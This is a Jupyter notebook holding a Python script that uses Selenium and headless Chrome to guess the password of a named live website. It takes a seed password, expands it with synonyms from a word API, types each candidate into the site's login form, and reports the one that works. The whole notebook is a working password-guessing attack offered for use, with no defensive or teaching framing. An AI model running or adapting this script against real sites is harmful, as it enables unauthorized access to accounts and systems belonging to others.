{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "import time\n",
    "import json\n",
    "import requests\n",
    "from webdriver_manager.chrome import ChromeDriverManager\n",
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.webdriver.common.action_chains import ActionChains\n",
    "from selenium.webdriver.support import expected_conditions\n",
    "from selenium.webdriver.support.wait import WebDriverWait\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "from selenium.webdriver.common.desired_capabilities import DesiredCapabilities\n",
    "\n",
    "def synonym(customlist, searchterm):\n",
    "    customlist = []\n",
    "    resp = requests.get('https://api.datamuse.com/words?ml=' + searchterm)\n",
    "    if resp.status_code != 200:\n",
    "        # This means something went wrong.\n",
    "        raise ApiError('GET /' + searchterm + '/ {}'.format(resp.status_code))\n",
    "    for item in resp.json():\n",
    "        customlist.append('{}'.format(item['word']))\n",
    "        customlist.append('{}'.format(item['word']).title())\n",
    "    return customlist\n",
    "\n",
    "def setup_method():\n",
    "    options = webdriver.ChromeOptions()\n",
    "    options.add_argument('no-sandbox')\n",
    "    options.add_argument('headless')\n",
    "    global driver\n",
    "    global vars\n",
    "    driver = webdriver.Chrome(options=options, executable_path=ChromeDriverManager().install())\n",
    "\n",
    "def login_zuckwatch(password):\n",
    "    driver.get(\"https://zuckwatch.com/\")\n",
    "    driver.find_element(By.CSS_SELECTOR, \".input\").click()\n",
    "    driver.find_element(By.CSS_SELECTOR, \".input\").send_keys(password)\n",
    "    driver.find_element(By.LINK_TEXT, \"Login\").click()\n",
    "    WebDriverWait(driver, 2000).until(expected_conditions.presence_of_element_located((By.CSS_SELECTOR, \".nuxt-progress-failed\")))\n",
    "    isPresent = len(driver.find_elements(By.CSS_SELECTOR, \".nuxt-progress-failed\")) > 0\n",
    "    if isPresent:\n",
    "        print(\"Incorrect password: \" + password)\n",
    "    else:\n",
    "        print(\"The password is: \" + password)\n",
    "        return 'Correct'\n",
    "\n",
    "def teardown_method():\n",
    "    driver.quit()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "new_list = []\n",
    "deduped_list = []\n",
    "search_list = [\n",
    "        'PASSWORD GOES HERE'\n",
    "        ]\n",
    "\n",
    "for term in search_list:\n",
    "    new_list.append(term)\n",
    "    new_list.append(term.title())\n",
    "    for item in synonym(new_list, term):\n",
    "        new_list.append(item)\n",
    "\n",
    "deduped_list = list(dict.fromkeys(new_list))\n",
    "\n",
    "print('searching ' + str(len(deduped_list)) + ' files...')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "setup_method()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "for password in new_list:\n",
    "    if login_zuckwatch(password) == 'Correct':\n",
    "        print('The password was found! It is ' + password)\n",
    "        break\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "teardown_method()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
